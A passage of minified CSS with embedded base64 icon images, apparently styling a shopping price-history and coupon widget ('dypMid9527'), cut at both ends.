qqXicnn1e/aBqRBhb31Wq4wIL/e10UCBiibLlcZTJHgOj5+fq6262Tyj5LVEaQAYU4aDQaCEYIskAGsED4jgzmcxlgOhH0OBLB47jd5uDy4OD9cTLBIEwPvYn/NPG+tTsdMi7hOdD1IYI+RSgmi9vbuwkGbKgPz4GloxhmAwp4h4XpdIoBK1qxR3BmWWJGZOA2IkBx1H5ak7Fhfdyk2hkSyx0+0B7f53NoERSLNdG47s+lllhtucEVgG02e5S7KHKDt0lR8JTNcIfAaCRsr9eiXC53IZsaXjjTrDC73U7YVusdvT08zAHZfAafmJaQAAGIGxF9kMCAE0BvQBwxHyUnktNTDtIoBgLw8T8sU0tYWpwNWQAAAABJRU5ErkJggg==)}.dypMid9527-price-title b{width:17px;height:11px;display:none!important;vertical-align:-1px;margin-left:2px}.dypMid9527-price-title b.up{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAALCAYAAACZIGYHAAAAAXNSR0IArs4c6QAAAVFJREFUKBWdkbEvQ1EUxu93qwxNxULE/qpJB10aiaGRDgTL64tKxNLFIhEmsz/BbBIjQROKWNQoYjBpxSISnRFNpO39nNv0NVQHdZabe873/c4590L9MUzEzZNqtl0OqBvdnuz2LuAEujZFvASVuRRzyPd2nITx7ACdtMeZ1T5faE9G0xGSdq2Qgtrxa78gHF/qZ+W1YBQP+Pi8z8nNngYglhmm4TkVB+UdTvVIfNmH/FiHsUwvq7Uz6ZbyBbajDgfX+V67kvyYAK4RHkrhdrtSd1xaXWsSEcBUq7sWAKCsNRbE8KGosgIoNgElaMxZgDXbiUSbb01Sd9JbsvWaJN6kkMTD0R2j7hQNTgQQFMMLAnoC94dPFvA9GpNw1NtoAj6htWsBVoRi7kKA8wI+RgDTnQANHR0vKV9WEAuhuYhSbs8WugktXiOPV4bCyn8AttkX4SmOSHvf1joAAAAASUVORK5CYII=);display:inline-block!important}.dypMid9527-price-title b.down{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAALCAYAAACZIGYHAAAAAXNSR0IArs4c6QAAAV1JREFUKBWdUD1LA0EUnL1EiJ6FhYUpUvoB2opgQFCjiIVgo53InadlLC3zEwTRQhTFRtBOvcrLHQg2YqF2VmLhRyMSEEThbp1HuOOEFCEPdmd33pvZ9xa2j6J9iRfbwxpaDAMaGa2QJ+44PhZa8TH2J3GlgA0NGFGII8vDeNrI8jHHLs/sAENpPn2mvh4s3NQaZRI1pTC2V8KDVcW00rgg30b+FQZG+ehzrIkxMWGhWqnimLhI8o2Cso5wwEITCu8ct4fmjzmguF3ChxjwL11BQzYJFuhCHksU+BwtT4MT0ib5w6zGAPl7PtD/reGu3qJDNKyblZWYCFkZxK/ZiXl2cid3GpwXMnB2p1DLZTBD/on0SPiJ00qArNRIJOPUr/V9PUDXl8ZEewHuVi9+4pzjoS8CrtlRt3RIXJZcQ5NY1AhpNBxqBMyZcb5pE/lEmT8WpvHfn6QTzZ451s0f3fVoPU8RDucAAAAASUVORK5CYII=);display:inline-block!important}.dypMid9527-price-title b.ping{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAALCAYAAACZIGYHAAAAAXNSR0IArs4c6QAAANBJREFUKBWVkTEKwkAUROdvtBM8g6BBEUlhoYW9YKWRINh5AntByFkECwtLEY9gaS14B+uQHVew0PiDcbsd/ryd+QsUPPTDlfXHNzamvazFZIW8uwUqJGqEPWVBhSEm8NYQ7AhWsyDJe1nTGUWevSRbEDOB3AVmKNf9WVzPg4s50ky/NAdKxJQ6hetoQFetDEm7f9V5guhPBgSOJCsQ2Zh5sPgLogLi2HpaTE1jK+y73Z0+EjjAc7akGTTNplzivcILoM3mamxHdTbDOeP46zMe3hVTrdkkgNUAAAAASUVORK5CYII=);display:inline-block!important}.dypMid9527-box-price{height:250px;box-sizing:border-box;left:0}#dypMid9527 #douyapu-line-chart{height:246px}.dypMid9527-priceBox-title{position:absolute;bottom:16px;text-align:center;width:100%;color:#999;display:none}.dypMid9527-priceBox-title span{color:#151515}.dypMid9527-priceBox-back{position:absolute;top:0;width:100%;height:100%;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIwAAABGCAMAAAApbYzeAAAAPFBMVEX////m5ubMzMzZ2dn9/f3z8/PV1dXr6+v39/fS0tLo6OjQ0NDc3Nz7+/vt7e3e3t7h4eH5+fnj4+Pv7++5QO2QAAACNklEQVRo3u3Y67qiIBQG4G/BAjkq2v3f6wztimmSye0j2uz6fhT1CL3JQRHLw45+J5eIlpcco0FYaCLyAdCelpeCaKFx4UI6N7+8pB22D9GlsxxjYanU2zBrG/1gPpgP5oN5c4xxZmOMWJQ5jPOTP22MwYLMYHjQI5Q3r4AZ9cAAktsLkyRXMcNZYfY6M71jNXINE/ML6w67YKjLEMOPmJKQsOcAPg0zmLFHDmvNu2Bc4suBjxhjuy+LDWiFiaEMgE7xtWjUPaZYBtcOgzhcv7xbylS8wxRLZ2IjTNRlxZi6+jqT/rAAbTDcq9JTA1cxyV8tvUErzBi/THRCjIwaxtwsneVGmKgJ1wySUcMYWywGjTBqLKNYYSaiajniql2xHIOpWY65uSqWkC1H3nbeLHBeZMuhmGIZGTgSUyydn7B9iFZZ7HT4ViXeLOPh+ybWdLWgMebpVgkyXS3H7yhJFss2GHaO12GUj+cKesQGmPLsdA0m2lN+SzpiK4wLgHZrMJSyKEjGdhgNhDUY9gZQ9nz0dt0UdKWbVC3I6QNMsgrntB/AspbLtJaW4mO9Xql+96lNsp+tp7xXyHmFJ1cvhcnd9DKYnJ+OEYvyjmfmDTFmUntgelowx5VIwrTHSEFW4lmmhDQ1x/QWgOif9pJIQlVa2g5DtKwxNZm/KkpJm58ZAcD2WJD2GEhLQq5rqc1s+t/WmQ/mX3mZP5HzszHBfQNekj/VUhaeb8aL2caIZn6sOUbScswvE/sUMiRQTdgAAAAASUVORK5CYII=) center no-repeat;display:none}.dypMid9527-priceBox-back span{color:#999;font-size:14px;margin-top:170px;display:block;text-align:center}.dypMid9527-box-active{box-sizing:border-box;width:480px;left:0;padding:14px 35px;min-height:182px}.dypMid9527-box-active a{color:#393939!important;line-height:25px;text-decoration:underline!important}.dypMid9527-box-active b{width:6px;height:6px;background-color:red;display:inline-block;border-radius:50%;margin-right:14px;vertical-align:2px}.dypMid9527-box-active i{display:inline-block;width:18px;height:12px}.dypMid9527-box-active i.icon3{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAMCAYAAABvEu28AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkRFM0QyNDFCQTMyRTExRTc4MDE5QzY2MjgzRTY2ODdDIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkRFM0QyNDFDQTMyRTExRTc4MDE5QzY2MjgzRTY2ODdDIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6REUzRDI0MTlBMzJFMTFFNzgwMTlDNjYyODNFNjY4N0MiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6REUzRDI0MUFBMzJFMTFFNzgwMTlDNjYyODNFNjY4N0MiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gSvktAAABQUlEQVR42qTSPyhFYRjH8ffce65EksSVm1KSkqKUK5tSFmUxGAzKwGCwGYzKhBhkMlmVlFGSQSmLwcJgkKLkX4lCx/e5/dST4RSe+pzznLfzPuc57/tGSegOiibMoB81IT2ecIDVkJxc2kCkQr3YQ2X4XbxjgGKHVqiKhxtUpEy4QKvyW+TxoM6tWD7DZcIVmcS68mE8amwEXdjFPNoxqgZy9k7Mpcd9+QULOMcVZrGDMyxhCsfYxhrqNK/POopcoXKUaaxa7du9Fi36jUbU6zmreYkV+nCF7jCOZXW3iDYUMYcNfcT+5M3N27fF3iQZ04B1kFEX1yho3NamA834xL0W2go+oyH+sTv+/BRcPuTyrFsbW+xBtv811n9/x6kOW5xyFHLazSOsUMTy0oROvTCtnfhT2HpslU7nP4pYfAkwAHJORRsmQeeWAAAAAElFTkSuQmCC);margin-left:10px}.dypMid9527-box-active button{position:absolute;bottom:16px;width:18px;height:18px;border:none;cursor:pointer}.dypMid9527-box-active button.l{right:65px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAABMUlEQVQ4T62U0U1DMQxFTzeADWADRmg3KBMAE0AnoExAmYAyAbABI9AJYAQ2KDpPNkrTpH0fWIoUJfH1tX2dCf9kkw7OCXAFTAH32g/wBrzHfse1BXQNPALe6fgdHmfAHNgCC2BdItVAXsrkAVh22Hp+H0A3+aYEkskzcBlMapyLYGeKMnsFBBqYJZB1+AKeOkwyiCmtIoLMboFza5ZAdwGQhS3ZJMgmii+jNPf6rhPIonqo01gQ35mWwecJ9AG4ygJnHVpMMpjvlch0DNAnMGtpJwLvAB1LrQe2l5oFUxunDe1ksWuw7PQgzrL9KtjWtoTYa78EVPxf+yUyRpCy0rqCzIxyRGTlmNRmOorQ+5dSLr2hNUWHszW0+gwiPDS0eTeILFb9jWSHj34jnaE/fPwLUAtVE7lTJPYAAAAASUVORK5CYII=)}.dypMid9527-box-active button.r{right:35px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAABLklEQVQ4T62UDU0DQRBGXx1QB6AAJBQHRQGgAFBAUdCigKIAHICEOqAS6gDyLjuX6XXvDho2uWRzs/N2fr7ZCf+0Jj2cE+AamAHuXTvgE3gt+z3XGugGWALa3oFt8TgF5sA38ACsM6kL0mgkT8CiJ1r/PxbQbZzJICN5AS5LCqZkFJsK0MjeAEFNZAHS6Qt4TpHclxTbwx2gkd0BZ9YsQDppiMLq497inuebOzAboO86QBbVn6aX1xjMtDwzD5A3+9UKnGFXpZNxmeeVyOy3oA/gAhgFDaUWkFrRD1KzYGpjmgpkSkOQ6HQjztx+Fbz6Y/sNQK217TeQEGTU4ShBRkYxInbDMeku4YpQu8PbyqVvaE3R4awNrT6NCIeGNmyNyMqXnxHB0eHRZ+Sop+4HfC5OE8tDxjwAAAAASUVORK5CYII=)}.dypMid9527-same{display:none}.dypMid9527-box-feast,.dypMid9527-box-same{box-sizing:border-box;width:480px;left:0;height:377px}.dypMid9527-title.feast i{display:inline-block;vertical-align:5px;margin-right:5px;width:20px;height:19px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAUCAYAAACEYr13AAAAAXNSR0IArs4c6QAAArBJREFUOBF9VE1IVFEY/b4742iGUSoStYiKmbEfrISiICoXRUbhzIhC1MYW0UYXRXtbBS5aVFCU0g9MuPCnTeQu7ZcQrTQks4LQMiQhtPJn3tzTeS+nTGe6i3ffO985537fd+99Iv8ZKI4csMFoTzIcvZqJ5k8XwKaqgE04TTaJ46pwRLQ7Hc/FTLoAZp24CiqM0XLGJw3Qm47nYosyQDhSDYtKNVomS/0vMZFYwfd3KQNsrNwmSZSKBO7rYPPnRRkAWgfVZn3T3iXfJd8TQsZZVr4NRe7ZRLLXWtsoMnPQjf1jgKoqH7HtBDs8oTpZ3ixmxiYSDQItETXnVQSyPLfFjXkG2BArtaHoiPQ7uwEEBGbQE67c8oHkGQF2KrRGDc4YyKiojOrz+IRngH31fiQRp3A1/ZZ5wrmHdtZzB+QZxJ4DXcWf9ZDiMa5fMJctM/jSX0HSelWdZXNWeVq//WOkWb7TFP3G2TkJBJ5yW/3yyjnhcg2sPcYUOyBymyvVqcoPSWrQM+JDB1pfqE8PcYHH4nOm9XXzMJvcQP5lhCI7lLUPUHRLsjWOaXSxlHWsu9MM3S1LmSycyVGEYg+Y2TfDetayqZ+0r21Ec2QX17zBwGaEjhYuFKa+mQ2TwB23uX6SHfYnxw1qX/sYJ6+2FDnjDP0qigI3g34r2JqRmCmgKKR23LD+DoVUo7w2OxM3Hc427GfO3UZ8ep2p5Nr3wxfSEdNhKI7uJR5Tn7npxRGM1SaDESAcrUknmI+hJFpkg5GP/E90urh3lHWo7ZIYvchb2JQMRpvcizNflHpHceURTKGPjZ/SJVLt4tzyv4MZnOIeNxCe5dFtpXsPGzUpqmsA4e3DHqhcMXlFZ7Xn2k9X+Y+BC7C+ArE4yZN2mOEwoTya8PTJEzasUd+2PHJ5qfELZMQVuMCBuK4AAAAASUVORK5CYII=) center no-repeat}.dypMid9527-title.feast span{display:inline-block;height:30px;line-height:30px;overflow:hidden}.dypMid9527-box-feast ul,.dypMid9527-box-same ul{height:363px;overflow:auto;padding:10px 26px 0!important}.dypMid9527-box-feast ul::-webkit-scrollbar,.dypMid9527-box-same ul::-webkit-scrollbar{width:4px}.dypMid9527-box-feast ul::-webkit-scrollbar-thumb:hover,.dypMid9527-box-same ul::-webkit-scrollbar-thumb:hover{background:#666}.dypMid9527-box-feast ul::-webkit-scrollbar-thumb,.dypMid9527-box-same ul::-webkit-scrollbar-thumb{background:#cdcdcd;border-radius:3px}.dypMid9527-box-feast ul::-webkit-scrollbar-track,.dypMid9527-box-same ul::-webkit-scrollbar-track{background:#f0f0f0}.dypMid9527-box-feast a,.dypMid9527-box-same a{display:block;height:80px;cursor:pointer}.dypMid9527-box-feast li,.dypMid9527-box-same li{height:80px;padding:10px 0!important;border-bottom:1px dashed #ddd;position:relative}.dypMid9527-feast-img img,.dypMid9527-same-img img{width:80px;height:80px;vertical-align:middle;margin-right:15px}.dypMid9527-feast-title,.dypMid9527-same-title{font-size:14px;color:#333;width:325px;height:40px;line-height:20px}.dypMid9527-feast-nPrice,.dypMid9527-same-nPrice{color:#FD2550;font-size:14px;font-weight:700;margin-top:20px;height:20px}.dypMid9527-feast-oPrice,.dypMid9527-same-oPrice{color:#999;font-weight:400;text-decoration:line-through}.dypMid9527-feast-btn,.dypMid9527-same-btn{width:160px;height:30px;line-height:30px;text-align:center;position:absolute;right:0;bottom:10px;background:linear-gradient(#FF4C88,#FD2550);border-radius:4px;color:#fff;font-size:14px;display:flex;align-items:center;justify-content:center}.dypMid9527-feast-btn i,.dypMid9527-same-btn i{margin-left:6px;width:18px;height:18px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAKlBMVEUAAAD////////////////////////////////9JVD/7vH/t8X+bov+N1/8nEgmAAAACHRSTlMA8djAmkMlPXIsu/oAAABhSURBVAjXY2BgYHUSVAlgAAI2i46OjuYEIKuwAwTEgUISYFZjAgNzBwQYMER0dPSsALJaGTw6OjpvA1ktDBpA1sxTHR1NDBIg1twdHY0IFkIWoQNhCsJkhG0IFyBchXApAEh7Qm0t9uKUAAAAAElFTkSuQmCC)}.dypMid9527-box-coupon{width:476px;min-height:150px;left:0}.dypMid9527-box-coupon>p{font-size:14px;color:#393939;margin:14px 0 12px 34px;line-height:21px}.dypMid9527-box-coupon>p a{color:#FD2550!important;margin-right:34px}.dypMid9527-coupon-topIcon{width:19px;height:18px;vertical-align:-3px;margin-right:6px;display:inline-block;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAASCAMAAACO0hVbAAAAXVBMVEUAAAD+JVD/Mlb+JlD/OGD+JlH/Ml/+JVD+JVD+JVH/J1b+JlD+JVD+JlH+JVD+JVD+JlH+JlH/JlH/KFL/KFT+JlH+JVH+JlH9JlD9JlH/JlL/J1H/J1H/JlL+JVBc6HZVAAAAHnRSTlMA8Q7mBvoK7MfAHeDVz/Xi2apvSSm3s7CcmnNiVVGNYSy9AAAAgElEQVQY073OSw7DIBADUE+GhkAgv6b/1vc/ZiGlbNp13gJZloUGgL+oXQySxyjXBlngpJxW+KiRnJEYdjA3qg+zgaMg60Lan6kOaHp22+7F/r4+yaNf+vTmFQsn3BxO4Be0ptq1Y+1sCYOJg1grIg5/afm6rQEQfjQ17NP93vIGCJwYIKWGvXkAAAAASUVORK5CYII=)}.dypMid9527-c-2c2c2c{color:#c2c2c2}.dypMid9527-coupon-right{margin:0 0 0 20px;font-size:12px;color:#393939;height:84px}.dypMid9527-coupon-right>p{margin-top:14px;line-height:18px;margin-bottom:14px}.dypMid9527-coupon-price{font-size:16px;font-weight:700;color:#f03}#dypMid9527-fnTimeCountDown{margin-left:2px}.dypMid9527-coupon-loading{display:flex;align-items:center;justify-content:center;margin-top:50px}.dypMid9527-coupon-loading b{background:url(data:image/gif;base64,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);width:45px;height:39px;display:inline-block}.dypMid9527-coupon-loading span{height:18px;line-height:16px}.dypMid9527-no-coupon{text-align:center;margin-top:14px}.dypMid9527-no-coupon b{display:inline-block;vertical-align:-13px;margin-right:2px;height:39px}.dypMid9527-has-no{width:42px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAcCAMAAABBJv+bAAACnVBMVEUAAAAAAAAHBAIHAwIAAAA4MBU3KRAkHgwDAgAFAgDLxlTIwVGimkGYlD6alj+Qijt6bzxwZyxzbFBTTCd4ayxxakpWTjM4MBUwKRUxMScmHRMAAAC4s0vCwKfBvFHT0p3RxlS5tkvCwrCgnnHRwlLGvlCcmWqpokW+t0y/wcWioHq8t02TjTybjz2Yl4aSlpSIfkGBfFV5bS53czF+dEliWy59dUlgWSyBfVd+d0poaGJhXyd3ZSpzaixZVj1BPBpXUDc/ORlvc3pTSiBsZCs7NCZGQyxGOxk8MxU/NRc8NiE6MRU1NUgQEAg1LRQfGQwAAAD+3Vr+21n/4lz/4Fv/3Vn/7GD93Fr+2ln/6F7+31v/7WH/5F7+3Fz+21b/+Wb/9mX/9GP/8mL/51rz2Vj+2Ef/5XT78WX48GT37GD/62D/8V//6l7/4lr/3lr/3Fr43Vf/4VT+21OXizz//+v57JbSzY7++IT/5mv/+2f/72H65V3/5Fz841z24Fvw2Fv/6Vri2Fr/5FnRzFX+3VTeyFLfzU7/3E3q0UzItkvCs0u8r0nt0UetoUe3qUawokStoUOnnEOumkGkl0CPgDe8oDaKfjV0aS73+Ov//+L//9by8c/7+sD//Lr//7X/9a1dl6z/85zx6Jny6JX+65BpkY+6u4xdgodpi4X/64P+54H+5n3V0nr/8Hj/6nH/9mj//Wf982f/8mfl2Gb072T68WLv6mLy31zu01vl21js11fq1Fffzlbbw1T/3lPz1VPlylPNxVLTyFHdxFHIwlHBuE6+tU22q01QTkr52Uizp0a7o0Wgk0WooETyz0NtZUKmkT+hkz6UhTuDejtkYTt4dTmIeDR+bzJ8bjBFPyAxMRY5MBUtLBUhHQ8PDAlEAEGxAAAAUXRSTlMABSYeCVlHRzYu/vjo5+DTzLKnoJ6demdfVVEW/v39/Pr6+Pf29PPz8vDs7OXi3NXHwLu4tra1tLCqppuYlZKRj46Kh4R6eXl3bl5UQ0A/KSKGPHEWAAACT0lEQVQoz2WShVIcQRBA5wT3QAKBuLu7u9vM6jknyLklENxDcIe4u7u7u7t9S5q9vToS3lZ11fTr6Z3qGRQgZd2K+GlT4peuSUHdCV0S06fEVVvrunhk/KLQ/+SG2aOv6FkFBRiLs3eOnCXtaoNjLulpTIgGA9rKyr3bxvUO2MQROprHnRAOgoakpW8ctMxvkweeYyDLYAIfwGgw+L5JPisdm0N8W8EwGKBpZdrJ7aPCBB2XwQhteRvLc5hQubzJxeG0QzsmysGGDFERYa/iabMCbEVz4Ycv9Qa3dnf/ZIQkczJpLHS8/P2HgfCp7b9LWjvqzHc9J3bNlCPZGD3xafPPXyrMp3b8KfN+rfr80arZM0yKgp+wora9/WTFxPrq2fX2b22Hjz0v358VhHptUQiaEEfRNTuc3XRb2dTatu/omzvHDyxAPbeqMcBBgd1OINLG/LJ35rpqtSd9Uw9RQzoQqFsvC4qNWLsZtNBchMECnLKA4wjog/NQ8GMWtJgPlEFOeyZrFZJFGfwaRi4gLj2nB69HkoRMUTophU2lgkt3Cl005dkz5DDUARbBUnn3qmrqX9RUP8xjhXrjqc47l0y64ISFusL7vqmxoaHxdYu3pYiG+rMT5AgIi9TB/5SmmxTLQnOV+sYDE4bpDhdfXFI/HYGhUgzhCeF5TCkchKSGr0QiyyNyGP95xQejC18MQiQoOiOXJsTvHez5yETUBWnc0Ey9JV8JUBZDRsTkMPQva+dGP7pa6naXFt6PSgiRoG7IVi+cHhs7dX6QLCD/Anpl9PCO0vXrAAAAAElFTkSuQmCC) center no-repeat}.dypMid9527-no-coupon span{font-size:14px;color:#393939}.dypMid9527-coupon-backImg{display:inline-block;width:228px;height:84px;margin-left:32px;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOQAAABUCAYAAACSnZv4AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjRGRkJERTk0OTIxNTExRTc5MUE3Q0IwMEYxNTJDQjE1IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjRGRkJERTk1OTIxNTExRTc5MUE3Q0IwMEYxNTJDQjE1Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NEZGQkRFOTI5MjE1MTFFNzkxQTdDQjAwRjE1MkNCMTUiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NEZGQkRFOTM5MjE1MTFFNzkxQTdDQjAwRjE1MkNCMTUiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6zAXTcAAAe1ElEQVR42uxdCZhUxbU+dbtnh2FYBkYGGEYUB1QUBRdAMGrQuJtE4zOocUVf3AUjMb6XRzSoIGLiFo1LlPiMLz5FfUbRmE82F1QQFEcWYRAUZRhgFmaY6e569Vfd6r7dfe9090z3TPtR5/su09zuvl3dt/46/1nqHFZWVkZCGCmJ/WvEiJHMCY/963c8adkHcxxGjBj